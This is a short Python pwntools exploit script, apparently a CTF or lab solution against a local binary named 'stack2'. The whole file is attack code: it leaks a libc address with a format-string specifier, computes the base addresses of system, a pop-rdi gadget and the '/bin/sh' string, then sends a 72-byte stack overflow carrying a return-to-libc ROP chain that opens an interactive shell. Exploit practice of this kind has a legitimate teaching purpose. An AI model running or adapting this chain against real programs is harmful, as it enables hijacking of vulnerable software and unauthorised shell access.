from pwn import *


libc_offset = 0x29d90

p = process("./stack2")

input()

p.recvuntil(b": ")
p.sendline("%17$p")


p.recvline() # Hallo
leak = p.recvline()
p.recvline()

leak = eval(leak[:-1])

print(hex(leak))

libc_base = leak - libc_offset
system_addr = libc_base + 0x50d70
pop_rdi_gadget = libc_base + 0x2a3e5
bin_sh_string = libc_base + 0x1d8678
print(f"libc_base @ {hex(libc_base)}")
print(f"system @ {hex(system_addr)}")
ret_gadget = 0x40101a

payload = b"A"*72 + p64(pop_rdi_gadget) + p64(bin_sh_string) + p64(ret_gadget) + p64(system_addr)
p.sendline(payload)


p.interactive()
